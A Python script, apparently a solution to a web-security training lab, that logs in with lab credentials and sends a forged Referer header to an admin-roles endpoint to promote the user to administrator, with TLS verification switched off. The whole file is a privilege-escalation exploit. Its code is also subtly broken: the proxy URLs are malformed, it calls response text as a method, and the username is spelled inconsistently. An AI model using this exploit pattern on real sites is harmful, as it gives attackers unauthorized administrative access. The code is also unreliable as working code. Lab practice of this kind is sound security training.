import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def upgrade_user(s, url):   
    #Logging in as the user administrator 
    print("(+) Logging in as the user weiner...")
    login_url = url + '/login'
    login_data = { 'username':'weiner', 'password':'peter'}
    r = s.post(login_url, data=login_data , verify=False, proxies=proxies)
    res= r.text()
    if 'Log out' in res:
        print('(+) Successfully Logged in as user weiner ')       
        #Upgrade the user to administrator
        print("(+) Upgrading user to administrator")
        upgrade_url = url + "/admin-roles?username=wiener&action=upgrade"
        headers= {'Referer': url + '/admin'}
        r = s.get(upgrade_url, headers=headers, proxies=proxies, verify=False)
        if r.status_code==200:
            print("(+) Successfully upgraded the user to administrator ")
        else:
            print("(+) Failed to upgrade the user to administrator ")
    else: 
        print('(+) Failure to log in as user weiner')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    url = sys.argv[1]
    upgrade_user(s, url)
    
if __name__ == '__main__':
    main()